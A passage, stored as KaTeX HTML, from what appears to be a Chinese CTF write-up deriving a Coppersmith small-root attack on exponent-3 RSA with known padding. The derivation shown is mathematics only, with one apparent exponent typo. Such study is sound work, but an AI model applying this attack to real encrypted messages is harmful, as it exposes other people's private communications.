style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 后面补了210组 <code>00000001</code> 比特。将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 看成十进制整数，于是得到这样的关系式：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><mi>p</mi><mi>a</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>m</mi><mn>0</mn></msub><mo>×</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup><mo>+</mo><msup><mn>2</mn><mn>0</mn></msup><mo>+</mo><msup><mn>2</mn><mn>8</mn></msup><mo>+</mo><mo>⋯</mo><mo>+</mo><msup><mn>2</mn><mrow><mn>8</mn><mo>×</mo><mn>219</mn></mrow></msup><mo>=</mo><msub><mi>m</mi><mn>0</mn></msub><mo>×</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup><mo>+</mo><mfrac><mrow><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup><mo>−</mo><mn>1</mn></mrow><mrow><msup><mn>2</mn><mn>8</mn></msup><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">m=pad(m_0)=m_0\times(2^8)^{210}+2^0+2^8+\cdots+2^{8\times219}=m_0\times(2^8)^{210}+\frac{(2^8)^{210}-1}{2^8-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.73333em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.9474379999999999em;vertical-align:-.08333em"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.9474379999999999em;vertical-align:-.08333em"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.66666em;vertical-align:-.08333em"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.864108em;vertical-align:0"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.864108em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mbin mtight">×</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.73333em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:2.260438em;vertical-align:-.7693300000000001em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.491108em"><span style="top:-2.314em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.740108em"><span style="top:-2.9890000000000003em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord">1</span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.677em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.7693300000000001em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>为了方便起见，记 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup></mrow><annotation encoding="application/x-tex">a=(2^8)^{210}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mfrac><mrow><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup><mo>−</mo><mn>1</mn></mrow><mrow><msup><mn>2</mn><mn>8</mn></msup><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">b=\frac{(2^8)^{210}-1}{2^8-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.512251em;vertical-align:-.403331em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10892em"><span style="top:-2.655em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.7463142857142857em"><span style="top:-2.786em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.485em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8913142857142857em"><span style="top:-2.931em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8913142857142857em"><span style="top:-2.931em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.403331em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，则有：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><mi>p</mi><mi>a</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>a</mi><msub><mi>m</mi><mn>0</mn></msub><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">m=pad(m_0)=am_0+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.73333em;vertical-align:-.15em"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal">b</span></span></span></span></span></p><p>于是根据 RSA 的加密关系，有：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>3</mn></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">c\equiv m^3 \bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.46375em;vertical-align:0"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.8641079999999999em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>≡</mo><mo stretchy="false">(</mo><mi>a</mi><msub><mi>m</mi><mn>0</mn></msub><mo>+</mo><mi>b</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">c\equiv (am_0+b)^3 \bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.46375em;vertical-align:0"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mord mathnormal">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mn>3</mn></msup><msubsup><mi>m</mi><mn>0</mn><mn>3</mn></msubsup><mo>+</mo><mn>3</mn><msup><mi>a</mi><mn>2</mn></msup><mi>b</mi><msubsup><mi>m</mi><mn>0</mn><mn>2</mn></msubsup><mo>+</mo><mn>3</mn><mi>a</mi><msup><mi>b</mi><mn>2</mn></msup><msub><mi>m</mi><mn>0</mn></msub><mo>+</mo><msup><mi>b</mi><mn>3</mn></msup><mo>−</mo><mi>c</mi><mo>≡</mo><mn>0</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">a^3m_0^3+3a^2bm_0^2+3ab^2m_0+b^3-c\equiv 0 \bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-.247em"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-2.4530000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.247em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-.247em"></span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-2.4530000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.247em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-.15em"></span><span class="mord">3</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.9474379999999999em;vertical-align:-.08333em"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.46375em;vertical-align:0"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord">0</span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span></span></p><p>到这里似乎不太好做了，我们得到的是一个三次多项式的同余方程，至少我解不出来，丢给 Mathematica 也解不出。于是以 modular polynomial equation 作为关键词检索了一下，还真发现个 Coppersmith method 似乎能解决这种方程。看了眼<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Coppersmith_method">维基百科上的解释</a>，发现这个算法已经在 SageMath 里实现好了，兴冲冲地拿去用，结果报错了。原来 Coppersmith method 要求这个多项式必须是首一多项式，而我们这个多项式最高次项前面有系数，那咋办？</p><p>幸好 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">a^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.8141079999999999em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span> 的逆元存在（记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>n</mi><mi>v</mi><mo stretchy="false">(</mo><msup><mi>a</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">inv(a^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-.25em"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:.03588em">v</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>），对方程两边同时乘以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>n</mi><mi>v</mi><mo stretchy="false">(</mo><msup><mi>a</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">inv(a^3)</annotation></semantics></math></span><span class="katex-html" 